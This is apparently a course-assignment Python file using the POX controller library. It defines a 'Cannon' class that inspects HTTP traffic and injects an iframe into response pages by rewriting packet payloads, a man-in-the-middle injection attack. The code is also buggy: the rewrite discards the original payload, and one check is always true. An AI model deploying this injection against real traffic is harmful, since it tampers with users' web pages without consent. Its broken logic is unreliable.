from pox.lib.packet.ipv4 import ipv4
import re

class Cannon(object):
    
    def __init__ (self, target_domain_re, url_path_re, iframe_url):
        self.target_domain_re = target_domain_re
        self.url_path_re = url_path_re
        self.iframe_url = iframe_url

    # Input: an instance of ipv4 class
    # Output: an instance of ipv4 class or None
    def manipulate_packet (self, ip_packet):
        print "src = ", ip_packet.srcip
    	print "dst = ", ip_packet.dstip
	urlMatch=0
	domMatch=0
	if(ip_packet.find('tcp')):
		myPacket=ip_packet.payload.payload
		print myPacket
		splitPacket = myPacket.split()
		if(len(splitPacket)!=0):
			print "FIRST WORD",splitPacket[0]
			if(splitPacket[0]=="GET"):
				myURL=splitPacket[1]
				print myURL
				#if it is a GET request, begin to match hostname
				splitByLine=myPacket.split('\n')
				for index, line in enumerate(splitByLine):
					if("Host: " in line):
						hostLine=splitByLine[index].split()
						print hostLine[1]
						urlMatch=re.search(self.url_path_re, myURL)
						domMatch=re.search(self.target_domain_re, hostLine[1])
						if(urlMatch and domMatch):
							print "BOTH MATCH"
							print myURL
							print hostLine[1]

		if("</body>" in myPacket and "HTTP/1.1 200 OK"):
			for ind, word in enumerate(splitPacket):
				if(word=="</body>"):
					word="<iframe src=""http://cryptosec.ucsd.edu""></iframe></body>"
					newStr=''.join(word)
					myPacket=newStr
					ip_packet.payload.payload=myPacket
					print "NEW PAYLOAD ALERT ~~~~~~~~~~~~~~~"
					print ip_packet.payload.payload
		
			
		if("sysnet.ucsd.edu" in myPacket):
			print "MATCH LOL"
			print self.target_domain_re

	
	

    	

    	# Must return an ip packet or None
    	return ip_packet

